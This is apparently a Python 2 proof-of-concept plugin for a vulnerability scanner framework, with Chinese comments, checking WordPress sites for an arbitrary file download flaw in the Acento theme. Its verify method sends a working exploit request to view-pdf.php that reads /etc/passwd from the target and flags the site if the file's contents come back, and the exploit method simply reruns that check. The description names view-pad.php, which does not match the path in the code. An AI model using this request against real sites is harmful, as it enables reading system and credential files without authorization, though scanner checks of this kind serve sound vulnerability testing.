# coding: utf-8

import urllib2
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0999' # 平台漏洞编号，留空
    name = 'WordPress Acento Theme Arbitrary File Download' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_OPERATION # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
        wp主题插件acento theme 中view-pad.php 文件,可读取任意文件
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34578/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3b0a393a-4c0a-456d-b7e0-5d23a39c5261'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        path = "{target}/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/etc/passwd".format(target=self.target)
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
        target=self.target, vuln=self.vuln))
        try:
            request = urllib2.Request(path)
            response = urllib2.urlopen(request)
            content = response.read()
            if 'root:' in content and 'nobody:' in content:
                self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
